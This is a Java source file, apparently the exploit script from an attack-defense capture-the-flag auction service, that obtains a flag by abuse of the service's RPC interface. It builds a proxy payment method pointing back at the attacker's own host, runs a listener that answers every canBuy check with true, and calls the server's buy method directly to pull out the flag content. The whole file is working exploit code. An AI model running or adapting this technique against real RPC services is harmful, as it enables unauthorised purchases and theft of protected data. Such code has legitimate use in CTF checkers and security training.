package checker;

import de.faust.auction.AuctionException;
import de.faust.auction.AuctionService;
import de.faust.auction.RPCInvocationHandler;
import de.faust.auction.communication.*;
import de.faust.auction.model.PaymentMethod;

import java.io.IOException;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.NotBoundException;
import java.rmi.server.RMISocketFactory;
import java.util.logging.Logger;


public class Exploit2 {
    private static final Logger logger = Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);

    public static void main(String[] args) throws IOException, NotBoundException, AuctionException {
        // get command line arguments
        if (args.length < 3) {
            System.err.println("usage: java " + Exploit2.class.getName() + " <serverRegistryHost> <flag-id> <exploitHost>");
            return;
        }

        String serverRegistryHost = args[0]; //host name or IP the auction service is running on
        String flagId = args[1]; // The flag id for the flag
        String exploitHost = args[2]; //The hostname for this exploit to listen on, must be reachable by server

        // create proxy for PaymentMethod
        InvocationHandler handler = new RPCInvocationHandler(new RPCRemoteReference(exploitHost, 0));
        PaymentMethod proxy = (PaymentMethod) Proxy.newProxyInstance(
                PaymentMethod.class.getClassLoader(), new Class[]{PaymentMethod.class}, handler);
        
        RPCConnection.enableTimeouts();
        
        // start server that response with true on PaymentMethod.canBuy(AuctionEntry)
        new AcceptorThread(RPCServer.SERVER_PORT).start();

        //connect directly to the AuctionService's skeleton without using the stub
        // because RPCRemoteObjectManager.getStub would fail on proxy
        Socket socket = RMISocketFactory.getSocketFactory().createSocket(serverRegistryHost, RPCServer.SERVER_PORT);
        RPCObjectConnection objectConnection = new RPCObjectConnection(socket);

        String methodName = "buy"; //method that shall be called in AuctionServiceImpl
        //find the method that shall be called
        Method method = null;
        for (Method m : AuctionService.class.getDeclaredMethods()) {
            if (m.toGenericString().contains(methodName)) {
                logger.info("Found the method: " + m.toGenericString());
                method = m;
                break;
            }
        }
        if (method == null) {
            logger.info(methodName + " could not be found in the class AuctionServiceImpl or its superclasses.");
            return;
        }

        String clientID = Utils.randomGuid();
        String rpcID = Utils.randomGuid();
        // call auctionService.buy(flagId, proxy)
        RPCRequest request = new RPCRequest(0, method.toGenericString(), new Object[]{flagId, proxy}, clientID, rpcID, 0);
        RPCResponse recv = null;
        try {
            objectConnection.sendObject(request);
        } catch (Exception se) {
            logger.info("sendObject: " + se.toString());
        }
        try {
            recv = (RPCResponse) objectConnection.receiveObject();
        } catch (IOException e) {
            logger.info("receiveObject: " + e.toString());
        } catch (ClassNotFoundException e) {
            logger.info("receiveObject: " + e.toString());
        }

        String response = (String) recv.getObject();
        System.out.println("Content: " + response);
    }

    private static class AcceptorThread extends Thread {

        private final int port;

        public AcceptorThread(int port) {
            this.port = port;
            setDaemon(true);
        }

        public void run() {
            ServerSocket listenSocket = null;
            try {
                listenSocket = RMISocketFactory.getSocketFactory().createServerSocket(port);
            } catch (IOException e) {
                System.err.println("new ServerSocket(port): " + e.getMessage());
                System.exit(1);
            }
            //accept incoming connections
            Socket clientSocket = null;
            while (true) {
                try {
                    clientSocket = listenSocket.accept();
                    logger.info("New connection");
                } catch (IOException e) {
                    System.err.println("listenSocket.accept(): " + e.getMessage());
                    continue;
                }
                Thread thread = new WorkerThread(clientSocket);
                thread.start();
            }
        }
    }

    private static class WorkerThread extends Thread {
        private final Socket clientSocket;

        WorkerThread(Socket clientSocket) {
            this.clientSocket = clientSocket;
            setDaemon(true);
        }

        public void run() {
            try {
                RPCObjectConnection objectConnection;
                try {
                    objectConnection = new RPCObjectConnection(this.clientSocket);
                } catch (IOException e) {
                    e.printStackTrace();
                    return;
                }
                while (objectConnection.isConnected()) {
                    RPCRequest request;
                    try {
                        request = (RPCRequest) objectConnection.receiveObject();
                    } catch (IOException e) {
                        if (!objectConnection.isConnected()) {
                            System.out.println("Client disconnected");
                        }
                        objectConnection.close();
                        return;
                    } catch (ClassNotFoundException e) {
                        continue;
                    }
                    
                    // just always respond with true

                    Object obj = true;
                    RPCResponse response = new RPCResponse(obj, request.getRpcID(), request.getSequenceNumber());
                    objectConnection.sendObject(response);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
